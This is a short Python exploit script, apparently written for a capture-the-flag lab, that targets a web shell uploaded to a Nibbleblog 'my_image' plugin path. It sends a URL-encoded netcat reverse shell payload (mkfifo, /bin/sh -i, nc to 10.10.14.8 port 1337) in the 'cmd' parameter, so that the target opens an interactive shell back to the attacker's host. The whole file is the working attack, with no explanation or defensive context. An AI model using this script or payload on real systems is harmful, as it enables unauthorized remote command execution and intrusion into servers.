import requests

ip = "10.10.14.8"

port = "1337"

payload="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20"+ip+"%20"+port+"%20%3E%2Ftmp%2Ff%0A"

url = "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd="

exploit = url+payload

r = requests.get(exploit)

print(r.text)
